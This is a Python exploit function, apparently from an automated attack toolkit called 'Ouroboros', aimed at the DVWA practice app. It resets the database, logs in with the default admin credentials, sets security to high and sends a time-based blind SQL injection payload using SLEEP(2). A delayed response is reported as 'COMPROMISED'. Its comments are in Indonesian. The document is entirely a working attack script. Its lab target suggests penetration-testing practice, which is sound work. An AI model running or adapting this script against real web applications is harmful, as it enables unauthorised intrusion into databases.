def run_exploit(target_url):
    """
    Ouroboros Payload 1: SQLi Time-Based Blind (HIGH Level Bypass)
    Targeting HIGH level DVWA using SLEEP() command to infer vulnerability when UNION is blocked.
    """
    import requests, re, time
    session = requests.Session()
    
    def extract_token(html):
        m = re.search(r"name=['\"]user_token['\"].*?value=['\"]([a-f0-9]{32})['\"]", html, re.I)
        return m.group(1) if m else None
        
    try:
        tok = extract_token(session.get(f"{target_url}/setup.php", timeout=5).text)
        if tok: session.post(f"{target_url}/setup.php", data={"create_db": "Create / Reset Database", "user_token": tok})
        tok2 = extract_token(session.get(f"{target_url}/login.php").text)
        session.post(f"{target_url}/login.php", data={"username": "admin", "password": "password", "Login": "Login", "user_token": tok2})
        tok3 = extract_token(session.get(f"{target_url}/security.php").text)
        session.post(f"{target_url}/security.php", data={"security": "high", "seclev_submit": "Submit", "user_token": tok3})
        
        # Payload Time-Based Blind
        payload = "1' AND SLEEP(2) AND '1'='1"
        
        start_time = time.time()
        # Di level HIGH, id dikirim via session variable (di DVWA, form terpisah)
        # Tapi kita serang endpoint GET secara langsung jika memungkinkan
        r = session.get(f"{target_url}/vulnerabilities/sqli/", params={"id": payload, "Submit": "Submit"})
        end_time = time.time()
        
        if end_time - start_time >= 2:
            return {"status": "COMPROMISED", "details": f"SQLi Time-Based Blind berhasil. Waktu eksekusi: {end_time - start_time:.2f} detik."}
        else:
            return {"status": "FAILED", "details": "Time-based payload diblokir atau tidak tereksekusi."}
    except Exception as e:
        return {"status": "FAILED", "details": str(e)}
